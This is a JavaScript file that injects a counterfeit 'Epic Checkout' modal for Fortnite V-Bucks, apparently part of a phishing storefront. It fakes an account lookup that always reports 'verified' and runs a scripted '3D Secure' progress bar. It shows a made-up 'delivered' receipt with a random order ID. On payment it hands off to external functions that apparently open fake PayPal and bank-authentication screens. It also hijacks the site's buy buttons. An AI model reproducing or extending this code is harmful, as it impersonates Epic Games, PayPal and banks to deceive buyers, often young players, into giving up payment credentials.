(() => {
  'use strict';
  const path = location.pathname;
  if (window.__lvxCheckout) return;
  window.__lvxCheckout = true;

  const configs = {
    fortnite: {
      theme: 'lvx-theme-fortnite', brand: 'Epic Games', header: 'Epic Checkout', logo: 'assets/epic-logo.png',
      playerLabel: 'Fortnite username', placeholder: 'Enter Fortnite username…', productName: '2,400 V-Bucks',
      price: '€19.99', image: 'assets/vbucks-2400.webp'
    }
  };

  const platformOptions = {
    pc: { label: 'PC / Epic Games', icon: 'assets/windows-pc-white.svg' },
    playstation: { label: 'PlayStation 5 / PS4', icon: 'assets/playstation-white.svg' },
    xbox: { label: 'Xbox Series X|S / One', icon: 'assets/xbox-white.svg' }
  };

  const config = configs.fortnite;
  let product = { name: config.productName, price: config.price, image: config.image };
  let username = '';
  let platform = '';
  let timer = null;
  let timers = [];
  let payment = 'visa';

  const esc = value => String(value ?? '').replace(/[&<>'"]/g, character => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;'
  }[character]));

  const initial = value => String(value || '').trim().charAt(0).toUpperCase() || 'F';
  const platformMeta = () => platformOptions[platform] || { label: 'Choose a platform', icon: platformOptions.pc.icon };
  
  function getFormattedPrice() {
    const sym = window.currentCurrencySymbol || '€';
    const numMatch = String(product.price || '').match(/[\d,.]+/);
    const num = numMatch ? numMatch[0] : '19.99';
    return sym + num;
  }

  function fromFortnite(items) {
    if (Array.isArray(items) && items.length) {
      const total = items.reduce((sum, item) => sum + Number(item?.price || 0), 0);
      return {
        name: items.length > 1 ? `${items.length} Fortnite items` : items[0].name || 'Fortnite item',
        price: `${window.currentCurrencySymbol || '€'}${total.toFixed(2)}`,
        image: items[0].img || config.image
      };
    }
    const rows = [...document.querySelectorAll('.cart-row')];
    if (rows.length) {
      const priceText = document.querySelector('.cart-summary .total b')?.textContent || '19.99';
      const numMatch = priceText.match(/[\d,.]+/);
      const val = numMatch ? numMatch[0] : '19.99';
      return {
        name: rows.length > 1 ? `${rows.length} Fortnite items` : rows[0].querySelector('.cart-name')?.textContent || 'Fortnite item',
        price: `${window.currentCurrencySymbol || '€'}${val}`,
        image: rows[0].querySelector('img')?.src || config.image
      };
    }
    const title = document.querySelector('#detailTitle')?.textContent?.trim() || 'Fortnite Item';
    const priceEl = document.querySelector('#detailPrice')?.textContent || '19.99';
    const numMatch = priceEl.match(/[\d,.]+/);
    const val = numMatch ? numMatch[0] : '19.99';
    return {
      name: title,
      price: `${window.currentCurrencySymbol || '€'}${val}`,
      image: document.querySelector('#sideImg')?.src || config.image
    };
  }

  const applePayBadge = `<span class="lvx-apple-logo-crop"><img src="assets/apple-pay-logo.png" alt="Apple Pay"></span>`;

  document.body.insertAdjacentHTML('beforeend', `
    <div class="lvx-checkout ${config.theme}" id="lvxCheckout" aria-hidden="true">
      <div class="lvx-backdrop" data-lvx-close></div>
      <section class="lvx-shell" role="dialog" aria-modal="true" aria-label="${esc(config.brand)} checkout">
        <header class="lvx-top">
          <div class="lvx-brand">
            <img src="${config.logo}" alt="${esc(config.brand)}">
            <div><strong>${esc(config.header)}</strong><span>${esc(config.brand)}</span></div>
          </div>
          <button class="lvx-close" type="button" aria-label="Close checkout" data-lvx-close>×</button>
        </header>

        <div class="lvx-stage">
          <!-- Step 1: Link Account -->
          <section class="lvx-panel active" data-lvx-panel="player">
            <h2>LINK FORTNITE ACCOUNT</h2>
            <p class="lvx-sub">Select your platform and enter your Fortnite username to receive this item.</p>
            <div class="lvx-order">
              <img id="lvxOrderImage" src="${config.image}" alt="">
              <div>
                <span>Item Selected</span>
                <strong id="lvxOrderName">${esc(config.productName)}</strong>
                <small><b id="lvxOrderPlatform">Choose platform</b> · Instant Digital Delivery</small>
              </div>
            </div>
            <span class="lvx-label">Gaming Platform</span>
            <div class="lvx-platform-grid" role="group" aria-label="Recipient platform">
              ${Object.entries(platformOptions).map(([key, value]) => `
                <button type="button" data-lvx-platform="${key}" aria-label="${esc(value.label)}">
                  <img src="${value.icon}" alt="">
                  <span>${esc(value.label)}</span>
                </button>
              `).join('')}
            </div>
            <label class="lvx-label lvx-username-label" for="lvxUsername">${esc(config.playerLabel)}</label>
            <div class="lvx-search">
              <input id="lvxUsername" class="lvx-player-input" autocomplete="off" placeholder="${esc(config.placeholder)}">
              <button id="lvxSearch" type="button" disabled>Search Account</button>
            </div>
            <div class="lvx-lookup" id="lvxLookup">Choose a platform to begin search.</div>
            <div class="lvx-player" id="lvxPlayer">
              <span class="lvx-initial" id="lvxPlayerInitial">?</span>
              <div>
                <strong id="lvxPlayerName">Player</strong>
                <small id="lvxPlayerPlatform">Platform · Online on Epic Games</small>
              </div>
            </div>
            <button class="lvx-primary" id="lvxContinue" type="button" disabled>PROCEED TO PAYMENT →</button>
          </section>

          <!-- Step 2: Select Payment Method & Confirm -->
          <section class="lvx-panel" data-lvx-panel="payment">
            <h2>PAYMENT METHOD</h2>
            <p class="lvx-sub" id="lvxPaymentSub">Choose how you wish to pay for your Fortnite order.</p>
            <div class="lvx-order">
              <img id="lvxPaymentImage" src="${config.image}" alt="">
              <div>
                <span>Fortnite Item</span>
                <strong id="lvxPaymentName">${esc(config.productName)}</strong>
                <small><b id="lvxPaymentPlatform">Platform</b> · Epic Games Store</small>
              </div>
            </div>
            
            <label class="lvx-method-label">
              <span>Select Payment Option</span>
              <select id="lvxMethod">
                <option value="visa">Credit / Debit Card (Visa, MasterCard, Amex)</option>
                <option value="paypal">PayPal Express Checkout</option>
                <option value="applepay">Apple Pay</option>
              </select>
            </label>

            <div class="lvx-method-card">
              <div id="lvxMethodIcon">
                <b class="lvx-visa">CARD</b>
                <p><strong id="lvxMethodCardTitle">Credit / Debit Card</strong><span id="lvxMethodCardSub">Visa, MasterCard, American Express</span></p>
              </div>
              <div class="lvx-payment-row">
                <span>Total Amount Due</span>
                <strong id="lvxPaymentTotal">${config.price}</strong>
              </div>
            </div>

            <button class="lvx-primary" id="lvxPay" type="button">PAY NOW · ${config.price}</button>
            <button class="lvx-back" id="lvxBack" type="button">← Back to Account</button>
          </section>

          <!-- Step 3: 3D Secure / Verification Processing -->
          <section class="lvx-panel lvx-state" data-lvx-panel="processing">
            <div class="lvx-spinner"></div>
            <h2 id="lvxProcHeading">3D SECURE VERIFICATION</h2>
            <p id="lvxProcessingText">Connecting to bank authentication servers…</p>
            <div class="lvx-progress"><span id="lvxProgress"></span></div>
          </section>

          <!-- Step 4: Success & Order Receipt -->
          <section class="lvx-panel lvx-state" data-lvx-panel="success">
            <div class="lvx-check">✓</div>
            <h2>PURCHASE SUCCESSFUL!</h2>
            <p id="lvxSuccessCopy">Your Fortnite item has been credited to your Epic Games account.</p>
            <div class="lvx-receipt">
              <div class="lvx-receipt-head">
                <span class="lvx-initial" id="lvxReceiptInitial">F</span>
                <div>
                  <small>Fortnite Gift Sent To</small>
                  <strong id="lvxReceiptPlayer">Player</strong>
                </div>
              </div>
              <dl class="lvx-lines">
                <div><dt>Product</dt><dd id="lvxReceiptItem"></dd></div>
                <div><dt>Platform</dt><dd id="lvxReceiptPlatform">Platform</dd></div>
                <div><dt>Total Paid</dt><dd id="lvxReceiptPrice"></dd></div>
                <div><dt>Payment Method</dt><dd id="lvxReceiptPayment">Credit Card</dd></div>
                <div><dt>Order Transaction ID</dt><dd id="lvxReceiptOrder">FN-8921-4910</dd></div>
                <div><dt>Delivery Status</dt><dd style="color:#35e0ad;font-weight:800;">✓ DELIVERED TO ACCOUNT</dd></div>
              </dl>
            </div>
            <button class="lvx-primary" id="lvxDone" type="button">DONE & CLOSE</button>
          </section>
        </div>
      </section>
    </div>
  `);

  const modal = document.querySelector('#lvxCheckout');
  const $ = id => document.getElementById(id);
  const panels = [...modal.querySelectorAll('[data-lvx-panel]')];

  const show = name => {
    panels.forEach(panelNode => panelNode.classList.toggle('active', panelNode.dataset.lvxPanel === name));
  };

  function resetLookup(message = 'Choose a platform to begin search.') {
    clearTimeout(timer);
    username = '';
    $('lvxUsername').value = '';
    $('lvxLookup').textContent = message;
    $('lvxPlayer').classList.remove('ready');
    $('lvxPlayerInitial').textContent = '?';
    $('lvxContinue').disabled = true;
    $('lvxSearch').disabled = !platform;
    $('lvxSearch').textContent = 'Search Account';
  }

  function selectPlatform(value) {
    if (!platformOptions[value]) return;
    platform = value;
    const meta = platformMeta();
    modal.querySelectorAll('[data-lvx-platform]').forEach(button => button.classList.toggle('active', button.dataset.lvxPlatform === value));
    $('lvxOrderPlatform').textContent = meta.label;
    $('lvxPlayerPlatform').textContent = `${meta.label} · Online on Epic Games`;
    resetLookup(`Ready to search ${meta.label}.`);
    setTimeout(() => $('lvxUsername').focus(), 60);
  }

  function sync() {
    const meta = platformMeta();
    const formattedPrice = getFormattedPrice();

    $('lvxOrderName').textContent = $('lvxPaymentName').textContent = product.name;
    ['lvxOrderImage', 'lvxPaymentImage'].forEach(id => { if ($(id)) $(id).src = product.image; });
    $('lvxOrderPlatform').textContent = meta.label;
    $('lvxPaymentPlatform').textContent = meta.label;
    $('lvxPaymentTotal').textContent = formattedPrice;
    $('lvxPaymentSub').textContent = `Purchase ${product.name} for ${username || 'Fortnite Account'}.`;
    $('lvxMethod').value = payment;

    const cardLabel = window.currentCardLabel || 'Visa';
    const cardLast4 = window.currentCardLast4 || '4279';

    const methodCard = $('lvxMethodIcon');
    if (payment === 'paypal') {
      methodCard.innerHTML = `<b class="lvx-visa" style="background:#003087;color:#fff;">PAYPAL</b><p><strong>PayPal Express</strong><span>Pay securely using PayPal Balance or Saved ${cardLabel} •••• ${cardLast4}</span></p>`;
      $('lvxPay').textContent = `PAY WITH PAYPAL · ${formattedPrice}`;
    } else if (payment === 'applepay') {
      methodCard.innerHTML = `${applePayBadge}<p><strong>Apple Pay</strong><span>Pay instantly with Touch ID / Face ID</span></p>`;
      $('lvxPay').textContent = `PAY WITH APPLE PAY · ${formattedPrice}`;
    } else {
      methodCard.innerHTML = `<b class="lvx-visa">${cardLabel.toUpperCase().slice(0, 4)}</b><p><strong>${cardLabel} •••• ${cardLast4}</strong><span>Saved Card via Bank 3D Secure</span></p>`;
      $('lvxPay').textContent = `PAY NOW · ${formattedPrice}`;
    }
  }

  function open(nextProduct) {
    product = nextProduct || product;
    platform = '';
    modal.querySelectorAll('[data-lvx-platform]').forEach(button => button.classList.remove('active'));
    resetLookup();
    sync();
    show('player');
    modal.classList.add('open');
    modal.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
  }

  function close() {
    clearTimeout(timer);
    timers.forEach(clearTimeout);
    timers = [];
    modal.classList.remove('open');
    modal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  function lookup() {
    if (!platform) { $('lvxLookup').textContent = 'Please choose a gaming platform first.'; return; }
    const value = $('lvxUsername').value.trim();
    if (!value) { $('lvxLookup').textContent = `Enter your ${config.playerLabel}.`; return; }
    const meta = platformMeta();
    $('lvxSearch').disabled = true;
    $('lvxSearch').textContent = 'Searching...';
    $('lvxLookup').textContent = `Searching ${meta.label} database...`;

    timer = setTimeout(() => {
      username = value;
      $('lvxPlayerInitial').textContent = initial(username);
      $('lvxPlayerName').textContent = username;
      $('lvxPlayerPlatform').textContent = `${meta.label} · Fortnite Account Verified ✓`;
      $('lvxPlayer').classList.add('ready');
      $('lvxLookup').textContent = 'Account found & verified.';
      $('lvxContinue').disabled = false;
      $('lvxSearch').disabled = false;
      $('lvxSearch').textContent = 'Account Verified ✓';
    }, 800);
  }

  function pay() {
    const formattedPrice = getFormattedPrice();

    // Set entered username & platform globally so app_v2.js functions receive them
    window.enteredUsername = username || 'Player';
    window.currentPlatform = platform || 'pc';

    if (payment === 'paypal') {
      if (typeof window.showPaypalPopup === 'function') {
        window.showPaypalPopup();
      } else {
        processing();
      }
    } else if (payment === 'visa') {
      if (typeof window.showPaypalPopup === 'function' && typeof window.openBankAuthStep === 'function') {
        window.showPaypalPopup();
        window.openBankAuthStep();
      } else {
        processing();
      }
    } else {
      processing();
    }
  }

  function processing() {
    clearTimeout(timer);
    show('processing');
    const bar = $('lvxProgress');
    bar.style.width = '0';

    const textEl = $('lvxProcessingText');
    const headEl = $('lvxProcHeading');

    if (payment === 'paypal') {
      headEl.textContent = 'PAYPAL AUTHORIZATION';
      textEl.textContent = 'Authenticating PayPal token...';
    } else if (payment === 'applepay') {
      headEl.textContent = 'APPLE PAY CHECKOUT';
      textEl.textContent = 'Authenticating biometric token...';
    } else {
      headEl.textContent = '3D SECURE VERIFICATION';
      textEl.textContent = 'Connecting to bank 3D Secure verification...';
    }

    const stages = [
      [0.2, 25, 'Validating Fortnite player tag...'],
      [0.5, 60, 'Processing payment authorization...'],
      [0.8, 90, 'Issuing Epic Games item gift token...'],
      [1.0, 100, 'Order confirmed! Generating receipt...']
    ];

    const totalTime = 3000;
    stages.forEach(([part, percent, txt]) => {
      timers.push(setTimeout(() => {
        bar.style.width = `${percent}%`;
        textEl.textContent = txt;
      }, totalTime * part));
    });

    timers.push(setTimeout(success, totalTime + 300));
  }

  function success() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    const randPart = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    const cardLabel = window.currentCardLabel || 'Visa';
    const cardLast4 = window.currentCardLast4 || '4279';

    $('lvxReceiptInitial').textContent = initial(username);
    $('lvxReceiptPlayer').textContent = username;
    $('lvxReceiptItem').textContent = product.name;
    $('lvxReceiptPlatform').textContent = platformMeta().label;
    $('lvxReceiptPrice').textContent = getFormattedPrice();
    $('lvxReceiptPayment').textContent = payment === 'paypal' ? 'PayPal Express' : payment === 'applepay' ? 'Apple Pay' : `${cardLabel} •••• ${cardLast4}`;
    $('lvxReceiptOrder').textContent = `FN-${randPart()}-${randPart()}`;
    $('lvxSuccessCopy').textContent = `Item ${product.name} has been credited to ${username}.`;
    
    if (window.LVFortniteClearCart) window.LVFortniteClearCart();
    show('success');
  }

  modal.addEventListener('click', event => {
    const target = event.target.closest('button,[data-lvx-close]');
    if (!target) return;

    if (target.dataset.lvxPlatform) {
      event.preventDefault();
      selectPlatform(target.dataset.lvxPlatform);
      return;
    }

    const id = target.id;
    if (!target.matches('[data-lvx-close]') && !['lvxSearch', 'lvxContinue', 'lvxBack', 'lvxPay', 'lvxDone'].includes(id)) return;
    event.preventDefault();
    event.stopImmediatePropagation();

    if (target.matches('[data-lvx-close]') || id === 'lvxDone') { close(); return; }
    if (id === 'lvxSearch') { lookup(); return; }
    if (id === 'lvxContinue') { sync(); show('payment'); return; }
    if (id === 'lvxBack') { show('player'); return; }
    if (id === 'lvxPay') { pay(); return; }
  }, true);

  $('lvxUsername').addEventListener('keydown', event => { if (event.key === 'Enter') lookup(); });
  $('lvxMethod').addEventListener('change', event => {
    payment = event.target.value;
    sync();
  });

  addEventListener('keydown', event => { if (event.key === 'Escape' && modal.classList.contains('open')) close(); });

  document.addEventListener('click', event => {
    const button = event.target.closest('button');
    if (!button || modal.contains(button)) return;

    if (button.matches('.side-buy, .cart-checkout, .card, [data-buy-item]')) {
      event.preventDefault();
      event.stopPropagation();
      event.stopImmediatePropagation();
      open(fromFortnite());
    }
  }, true);

  window.openCheckout = items => open(fromFortnite(items));
  window.LVXCheckout = { open, close, selectPlatform };
})();
